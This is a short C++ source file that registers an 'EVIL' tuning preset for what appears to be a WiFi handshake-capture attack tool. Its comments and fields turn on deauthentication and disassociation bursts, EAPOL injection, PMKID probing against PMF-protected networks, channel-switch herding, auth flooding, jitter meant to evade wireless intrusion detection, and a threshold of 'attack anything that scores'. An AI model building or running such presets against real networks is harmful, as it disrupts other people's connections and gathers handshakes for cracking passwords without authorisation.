// "EVIL" pack - tuning bundle for the eViL capture method.
//
// eViL is the adaptive hunter: it prioritises targets that already handed us
// part of the 4-way, herds PMF-capable APs it cannot deauth, and lures
// stations to empty APs. This preset feeds it everything it can use:
//   - bidir + EAPOL + PMKID  -> maximal handshake yield per strike
//   - csaHerd                -> the PMF escape route (deauth is dropped)
//   - authFlood              -> the "attract" move on clientless APs
//   - dataAct                -> rank busy rooms first
//   - strictLock             -> never drift off the locked BSSID mid-capture
//   - HS DEPTH stays at M1+M2 in this preset; deeper capture requires the
//     user to raise HS DEPTH in RADIO. DEPTH HOLD applies only above M1+M2.
#include "pack_ctx.h"

namespace Cap {
namespace Packs {

static const Preset kEvilPreset{
    /* bidirKick     */ true,   // AP->STA + STA->AP + deauth + disassoc
    /* eapolTx       */ true,   // pump EAPOL-Start/Logoff
    /* pmkidProbe    */ true,   // parallel PMKID route (works against PMF)
    /* csaHerd       */ true,   // herd the PMF-capable targets eViL can't deauth
    /* authFlood     */ true,   // attract stations to otherwise empty APs
    /* kickBurst     */ 3,
    /* pauseMs       */ 800,
    /* lockMs        */ 12000,  // ride out EAPOL retries
    /* hopMs         */ 200,
    /* jitterMs      */ 2,      // anti-WIDS spacing on the broadcast path
    /* cooldownSec   */ 6,      // let victims re-associate between strikes
    /* scoreThr      */ 0,      // attack anything that scores
    /* hsDepth       */ 0,      // M1+M2; deeper capture is user-selected
    /* dataAct       */ 1,      // real data frames feed the hunger score
    /* strictLock    */ true,   // never drift off the locked BSSID
    /* depthHoldSec  */ 10,     // used only if HS DEPTH is manually raised
};

CAP_PACK_REGISTER(evil, "EVIL", "eViL", kEvilPreset)

} // namespace Packs
} // namespace Cap